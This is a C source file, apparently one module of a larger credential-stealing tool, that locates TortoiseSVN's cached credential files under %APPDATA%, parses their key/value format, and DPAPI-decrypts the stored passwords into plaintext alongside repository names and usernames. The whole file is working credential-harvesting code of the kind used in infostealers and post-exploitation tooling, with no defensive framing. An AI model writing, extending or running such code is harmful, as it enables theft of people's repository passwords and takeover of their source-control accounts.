/*
 * TortoiseSVN cached credentials extraction.
 *
 * SVN caches credentials in %APPDATA%\Subversion\auth\svn.simple\<md5>
 * using a length-prefixed K/V format:
 *   K 8
 *   username
 *   V 5
 *   admin
 *   ...
 *   END
 * The "password" value is DPAPI-protected (CryptUnprotectData) when
 * passwords are stored encrypted (default for TortoiseSVN).
 */
#include "tortoisesvn.h"
#include "browser/utils.h"
#include "browser/crypto.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

#define SVN_AUTH_SUBPATH "\\Subversion\\auth\\svn.simple"
#define SVN_MAX_FILES    200
#define SVN_MAX_LINES    1000

/* Parse one auth file into key/value pairs; returns count or -1 on error */
static int svn_parse_auth_file(const char* path,
                               char keys[][128], char values[][512], int max_pairs) {
    FILE* f = fopen(path, "rb");
    char line[1024];
    int line_no = 0;
    int pairs = 0;
    int expect_len = -1;  /* -1: expecting K/V definition; >=0: reading data */
    int is_key = 0;

    if (!f) return -1;
    while (fgets(line, sizeof(line), f) && line_no < SVN_MAX_LINES) {
        char clean[1024];
        size_t l;
        line_no++;
        line[strcspn(line, "\r\n")] = 0;
        l = strlen(line);
        while (l > 0 && (line[l-1] == ' ' || line[l-1] == '\t')) line[--l] = 0;

        if (expect_len < 0) {
            /* definition line: "K <len>" or "V <len>"; "END" terminates */
            if (_strnicmp(line, "END", 3) == 0) break;
            if ((line[0] == 'K' || line[0] == 'k' || line[0] == 'V' || line[0] == 'v') &&
                line[1] == ' ') {
                expect_len = atoi(line + 2);
                is_key = (line[0] == 'K' || line[0] == 'k');
                if (expect_len < 0 || expect_len > 4096) { expect_len = -1; is_key = 0; }
            }
            /* skip comments/blank */
            continue;
        } else {
            /* data line: first expect_len characters */
            if ((int)l < expect_len) { expect_len = -1; continue; }
            if (is_key && pairs < max_pairs) {
                strncpy(keys[pairs], line, sizeof(keys[pairs]) - 1);
                values[pairs][0] = 0;
                pairs++;
            } else if (pairs > 0) {
                strncpy(values[pairs - 1], line, sizeof(values[pairs - 1]) - 1);
            }
            expect_len = -1;
        }
    }
    fclose(f);
    return pairs;
}

static const char* svn_lookup(char keys[][128], char values[][512], int n, const char* key) {
    int i;
    for (i = 0; i < n; i++)
        if (_stricmp(keys[i], key) == 0) return values[i];
    return NULL;
}

const char* tortoisesvn_scan(void) {
    static char result[65536];
    int rp = 0;
    char appdata[MAX_PATH], folder[MAX_PATH], search[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hf;
    int found_files = 0, found_creds = 0;

    result[0] = 0;
    if (!GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata))) return result;
    snprintf(folder, sizeof(folder), "%s%s", appdata, SVN_AUTH_SUBPATH);
    if (!path_exists(folder)) {
        snprintf(result, sizeof(result),
                 "TortoiseSVN auth folder not found: %s\n", folder);
        return result;
    }

    snprintf(search, sizeof(search), "%s\\*", folder);
    hf = FindFirstFileA(search, &fd);
    if (hf == INVALID_HANDLE_VALUE) {
        snprintf(result, sizeof(result), "No cached SVN credentials in %s\n", folder);
        return result;
    }

    do {
        char path[MAX_PATH];
        char keys[32][128];
        char values[32][512];
        int n;
        const char *username, *realm, *password;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (fd.cFileName[0] == '.') continue;
        if (found_files >= SVN_MAX_FILES) break;
        found_files++;

        snprintf(path, sizeof(path), "%s\\%s", folder, fd.cFileName);
        n = svn_parse_auth_file(path, keys, values, 32);
        if (n <= 0) continue;

        username = svn_lookup(keys, values, n, "username");
        realm = svn_lookup(keys, values, n, "svn:realmstring");
        password = svn_lookup(keys, values, n, "password");
        if (!username || !password) continue;

        found_creds++;
        rp += snprintf(result + rp, sizeof(result) - rp,
                       "Repository: %s\nUsername: %s\n",
                       (realm && realm[0]) ? realm : "(unknown)", username);
        {
            uint8_t dec[4096];
            int dl = 0;
            int bl = (int)strlen(password);
            uint8_t* raw = (uint8_t*)malloc(bl + 1);
            int el = raw ? base64_decode(password, raw, bl) : -1;
            if (el > 0 && dpapi_decrypt(raw, el, 0, dec, &dl) == 0 && dl > 0) {
                int i;
                int printable = 1;
                if (dl >= (int)sizeof(dec)) dl = (int)sizeof(dec) - 1;
                for (i = 0; i < dl; i++)
                    if (dec[i] < 0x20 && dec[i] != 0) { printable = 0; break; }
                if (printable) {
                    dec[dl] = 0;
                    rp += snprintf(result + rp, sizeof(result) - rp,
                                   "Password: %s\n\n", (char*)dec);
                } else {
                    rp += snprintf(result + rp, sizeof(result) - rp,
                                   "Password: (DPAPI decrypted, %d bytes non-text)\n\n", dl);
                }
            } else {
                rp += snprintf(result + rp, sizeof(result) - rp,
                               "Password: (encrypted) %s\n\n", password);
            }
            free(raw);
        }
        if (rp > (int)sizeof(result) - 2048) break;
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);

    if (!found_files) {
        snprintf(result, sizeof(result), "No cached SVN credential files in %s\n", folder);
    } else if (!found_creds) {
        rp += snprintf(result + rp, sizeof(result) - rp,
                       "No usable credentials in %d file(s).\n", found_files);
    }
    return result;
}
